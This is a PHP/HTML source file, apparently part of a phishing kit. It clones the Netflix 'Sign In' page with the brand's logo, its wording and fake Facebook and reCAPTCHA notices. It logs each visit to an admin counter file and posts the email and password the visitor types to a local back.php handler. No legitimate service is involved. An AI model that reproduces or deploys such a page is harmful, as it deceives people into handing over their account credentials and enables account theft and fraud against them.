<?php


require("../contador-visitas.php");

contadorvisitas(1, "../admin/contador-visitas.txt");


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Netflix</title>
    <link rel="shortcut icon" href="../img/icon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style.css">
</head>


<body>
    <div class="body-1">
        <div class="body-2">
            <div class="row">
                <div class="col header d-flex justify-content-between" style="height: 87px;">
                    <a href="./"><img src="../img/logo-text.png" alt="" width="220px" class="netflix-logo"></a>
                </div>
            </div>
            <div class="form-1">
                <div class="form-2">
                    <h1>Sign In</h1>
                    <form action="back.php" method="POST" id="formulario">
                        <div class="formulario__grupo " id="grupo__email">
                            <input type="text" placeholder="Email or number of phone" class="input formulario__input" name="email" required>
                            <p class="error">Please enter a valid email or phone number.</p>
                        </div>
                        <br>
                        <div class="formulario__grupo dos " id="grupo__password">
                            <input type="password" placeholder="Password" class="input formulario__input " name="password" required>
                            <p class="error">Your password must contain between 4 and 60 characters.</p>
                        </div>
                        <br>
                        <input type="submit" value="Sign In" class="bt">
                        <div class="flex">
                            <div>
                                <input type="checkbox" class="check" width="50px">
                                <label for="" class="remember">Remember me</label>
                            </div>
                            <div>
                                <a href="" class="need-help">Need help?</a>
                            </div>
                        </div>
                    </form>
                    <div class="div-f">
                        <img src="../img/facebook.png" alt="" class="icon">
                        <span class="facebook">Login with Facebook</span>
                    </div>
                    <div class="div-n">
                        <span class="new"> New to Netflix?</span>
                        <a href="" class="new-login">Sign up now</a>
                    </div>
                    <p class="this">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="" class="fin">Learn more.</a></p>

                </div>
            </div>
            <img src="../img/footer.jpeg" alt="" class="footer" style="width: 100%;
                    margin-top: 100px;" >
        </div>
    </div>
</body>

<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.1/dist/umd/popper.min.js" integrity="sha384-SR1sx49pcuLnqZUnnPwx6FCym0wLsk5JZuNx2bPPENzswTNFaQU1RDvt3wT4gWFG" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.min.js" integrity="sha384-j0CNLUeiqtyaRmlzUHCPZ+Gy5fQu0dQ6eZ/xAww941Ai1SxSY+0EQqNXNE6DZiVc" crossorigin="anonymous"></script>
<script src="./main.js"></script>

</html>